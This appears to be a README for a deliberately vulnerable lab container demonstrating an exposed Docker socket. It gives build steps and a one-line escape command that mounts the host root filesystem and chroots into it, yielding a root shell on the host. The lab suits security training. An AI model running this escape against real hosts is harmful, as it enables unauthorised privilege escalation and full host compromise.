# Exposed Docker Socket

To build and run the container:

```console
docker build -t sock .
bash run-docker.sh
```

Inside the container, use the command from the `exploit` file:

```console
docker -H unix:///docker.sock run -it -v /:/host/ ubuntu chroot /host/ bash
```

This will open a new container with the root host as the container root.
